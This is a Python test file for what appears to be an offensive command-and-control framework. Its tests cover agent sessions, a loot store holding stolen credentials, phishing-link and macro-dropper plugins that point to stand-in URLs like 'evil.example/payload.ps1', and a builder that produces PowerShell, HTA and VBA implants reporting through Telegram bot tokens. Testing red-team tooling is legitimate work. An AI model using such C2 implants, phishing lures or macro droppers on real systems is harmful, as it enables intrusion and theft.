"""
Phase 9 — integration smoke tests.

Boots a Kernel with stub transports (no real Telegram/Discord connection),
registers a fake session, runs a plugin, and verifies the full pipeline:
  Kernel.execute() → plugin.run() → PluginContext.send() → C2Server.dispatch()
  → Router.send() → (fake ACK injected) → result returned → audit + loot saved
"""
from __future__ import annotations

import asyncio
import json
import time
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from fitnah.orchestration.session_manager import SessionManager
from fitnah.orchestration.audit_log import AuditLog
from fitnah.loot.store import LootStore
from fitnah.c2.server import C2Server
from fitnah.c2.router import Router
from fitnah.sdk.base_plugin import BasePlugin, ModuleResult
from fitnah.sdk.schema import ParamSchema
from fitnah.sdk.context import PluginContext


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def event_loop():
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def tmp_loot(tmp_path):
    store = LootStore(tmp_path / "loot.db")
    yield store
    store.close()


@pytest.fixture
def tmp_audit(tmp_path):
    return AuditLog(tmp_path / "audit.jsonl")


@pytest.fixture
def sessions():
    return SessionManager()


@pytest.fixture
def stub_router():
    """Router whose send() always succeeds without a real transport."""
    router = MagicMock(spec=Router)
    router.send      = AsyncMock(return_value=True)
    router.send_file = AsyncMock(return_value=True)
    router.active_transport = "stub"
    return router


@pytest.fixture
def c2_server(stub_router):
    return C2Server(stub_router, task_timeout=2)


# ── PluginContext unit tests ───────────────────────────────────────────────────

class TestPluginContext:
    def test_properties(self, event_loop, c2_server, sessions):
        session, _ = sessions.register(
            agent_id="a1", hostname="BOX", os="Win11", arch="x64",
            username="user", ip="1.2.3.4", priv_level="admin",
            transport="stub", group_id="g1",
        )
        ctx = PluginContext(session=session, c2=c2_server,
                           loop=event_loop, timeout=2)
        assert ctx.agent_id == "a1"
        assert ctx.hostname == "BOX"
        assert ctx.os       == "Win11"
        assert ctx.priv     == "admin"

    def test_send_returns_timeout_when_no_ack(self, event_loop, c2_server, sessions):
        session, _ = sessions.register(
            agent_id="a2", hostname="BOX2", os="Win10", arch="x64",
            username="u", ip="1.2.3.5", priv_level="user",
            transport="stub", group_id="g2",
        )
        ctx = PluginContext(session=session, c2=c2_server,
                           loop=event_loop, timeout=0.5)
        result = ctx.send("exec", {"cmd": "whoami"})
        # No ACK injected → timeout result
        assert result["status"] in ("timeout", "error")

    def test_exec_shortcut(self, event_loop, c2_server, sessions):
        session, _ = sessions.register(
            agent_id="a3", hostname="BOX3", os="Win10", arch="x64",
            username="u", ip="1.2.3.6", priv_level="user",
            transport="stub", group_id="g3",
        )
        ctx = PluginContext(session=session, c2=c2_server,
                           loop=event_loop, timeout=0.3)
        r = ctx.exec("whoami")
        assert "status" in r


# ── Plugin offline mode (ctx=None) ────────────────────────────────────────────

class TestPluginOfflineMode:
    def test_sysinfo_offline(self):
        from fitnah.plugins.recon.sysinfo import SysInfo
        from fitnah.sdk.testing import MockSession
        session = MockSession(hostname="H", os="W", priv_level="admin")
        result  = SysInfo().run(session, {}, ctx=None)
        assert result.ok
        assert result.data["hostname"] == "H"

    def test_any_live_plugin_returns_err_without_ctx(self):
        from fitnah.plugins.recon.screenshot import Screenshot
        from fitnah.sdk.testing import MockSession
        session = MockSession()
        result  = Screenshot().run(session, {}, ctx=None)
        assert not bool(result)
        assert "live" in result.error.lower() or "session" in result.error.lower()

    def test_shell_exec_offline(self):
        from fitnah.plugins.execution.shell_exec import ShellExec
        from fitnah.sdk.testing import MockSession
        result = ShellExec().run(MockSession(), {"cmd": "whoami"}, ctx=None)
        assert not bool(result)

    def test_phish_link_works_offline(self):
        from fitnah.plugins.initial_access.phish_link import PhishLink
        from fitnah.sdk.testing import MockSession
        result = PhishLink().run(
            MockSession(),
            {"url": "http://evil.example/payload.ps1", "target": "victim@corp.com"},
            ctx=None,
        )
        assert result.ok
        assert "evil.example" in result.data

    def test_macro_drop_offline(self):
        from fitnah.plugins.initial_access.macro_drop import MacroDrop
        from fitnah.sdk.testing import MockSession
        result = MacroDrop().run(
            MockSession(),
            {"url": "http://evil.example/s.ps1"},
            ctx=None,
        )
        assert result.ok
        assert "AutoOpen" in result.data


# ── Session manager ───────────────────────────────────────────────────────────

class TestSessionManager:
    def test_register_new(self, sessions):
        s, is_new = sessions.register(
            agent_id="x1", hostname="H", os="W", arch="x64",
            username="u", ip="1.1.1.1", priv_level="user",
            transport="tg", group_id="g",
        )
        assert is_new
        assert s.agent_id == "x1"

    def test_register_existing(self, sessions):
        for _ in range(2):
            s, is_new = sessions.register(
                agent_id="x2", hostname="H", os="W", arch="x64",
                username="u", ip="1.1.1.1", priv_level="user",
                transport="tg", group_id="g",
            )
        assert not is_new

    def test_stale_detection(self, sessions):
        s, _ = sessions.register(
            agent_id="x3", hostname="H", os="W", arch="x64",
            username="u", ip="1.1.1.1", priv_level="user",
            transport="tg", group_id="g",
        )
        assert not s.is_stale(ttl=300)
        s.checkin_at = time.time() - 400
        assert s.is_stale(ttl=300)

    def test_touch_records_history(self, sessions):
        s, _ = sessions.register(
            agent_id="x4", hostname="H", os="W", arch="x64",
            username="u", ip="1.1.1.1", priv_level="user",
            transport="tg", group_id="g",
        )
        s.touch("exec:whoami", "ok")
        s.touch("ps:Get-Process", "ok")
        h = s.history(5)
        assert len(h) == 2
        assert h[0]["action"] == "exec:whoami"


# ── Audit log ─────────────────────────────────────────────────────────────────

class TestAuditLog:
    def test_record_and_tail(self, tmp_audit):
        tmp_audit.record("op", "plugin_run", target="a1", result="ok")
        tmp_audit.record("op", "checkin",    target="a1")
        entries = tmp_audit.tail(10)
        assert len(entries) == 2

    def test_search_by_field(self, tmp_audit):
        tmp_audit.record("op", "plugin_run", target="a1",
                         detail={"plugin": "sysinfo"})
        tmp_audit.record("op", "plugin_run", target="a2",
                         detail={"plugin": "screenshot"})
        hits = tmp_audit.search("a1")
        assert len(hits) >= 1
        assert all("a1" in json.dumps(e) for e in hits)

    def test_plugin_run_helper(self, tmp_audit):
        tmp_audit.plugin_run(
            operator="op", agent_id="a1", plugin="sysinfo",
            params={}, result="ok",
        )
        entries = tmp_audit.tail(1)
        # plugin_run helper stores action as "plugin:<name>"
        assert "plugin" in entries[0]["action"]


# ── Loot store ────────────────────────────────────────────────────────────────

class TestLootIntegration:
    def test_add_and_search(self, tmp_loot):
        lid = tmp_loot.add("agent-001", "credential", "admin:pass", b"pass123")
        rows = tmp_loot.search(agent_id="agent-001")
        assert any(r["id"] == lid for r in rows)

    def test_export_csv_round_trip(self, tmp_loot):
        import csv, io
        tmp_loot.add("a1", "file",       "doc.docx",    b"data")
        tmp_loot.add("a1", "screenshot", "desktop.bmp", b"imgdata")
        rows    = tmp_loot.full_search()
        csv_str = tmp_loot.export_csv(rows)
        parsed  = list(csv.DictReader(io.StringIO(csv_str)))
        assert len(parsed) == 2

    def test_bloodhound_export_filters(self, tmp_loot):
        tmp_loot.add("a1", "credential", "admin:pass",  b"pass")
        tmp_loot.add("a1", "screenshot", "screen",      b"img")
        rows = tmp_loot.full_search()
        bh   = json.loads(tmp_loot.export_bloodhound(rows))
        assert bh["meta"]["count"] == 1
        assert bh["data"][0]["source"] == "credential"


# ── Builder integration ───────────────────────────────────────────────────────

class TestBuilderIntegration:
    def test_ps1_end_to_end(self, tmp_path):
        from fitnah.builder.engine import BuildEngine
        from fitnah.builder.models import BuildRequest, OutputFormat, Encrypt

        req    = BuildRequest(
            bot_token="123:TOKEN", chat_id="-100999", agent_id="smoke-01",
            format=OutputFormat.PS1, encrypt=Encrypt.NONE,
            output_dir=str(tmp_path),
        )
        engine = BuildEngine(tmp_path)
        result = engine.build(req)
        assert result.ok
        src = result.path.read_text(encoding="utf-8")
        assert "CHECKIN" in src
        assert "getUpdates" in src
        assert "123:TOKEN" in src
        assert "-100999" in src

    def test_hta_end_to_end(self, tmp_path):
        from fitnah.builder.engine import BuildEngine
        from fitnah.builder.models import BuildRequest, OutputFormat, Encrypt

        req    = BuildRequest(
            bot_token="456:HTA", chat_id="-200", agent_id="smoke-hta",
            format=OutputFormat.HTA, encrypt=Encrypt.NONE,
            output_dir=str(tmp_path),
        )
        result = BuildEngine(tmp_path).build(req)
        assert result.ok
        assert "<HTA:APPLICATION" in result.path.read_text(encoding="utf-8")

    def test_vba_end_to_end(self, tmp_path):
        from fitnah.builder.engine import BuildEngine
        from fitnah.builder.models import BuildRequest, OutputFormat, Encrypt

        req    = BuildRequest(
            bot_token="789:VBA", chat_id="-300", agent_id="smoke-vba",
            format=OutputFormat.VBA, encrypt=Encrypt.NONE,
            output_dir=str(tmp_path),
        )
        result = BuildEngine(tmp_path).build(req)
        assert result.ok
        src = result.path.read_text(encoding="utf-8")
        assert "AutoOpen" in src
        assert "Document_Open" in src
        assert "WScript.Shell" in src
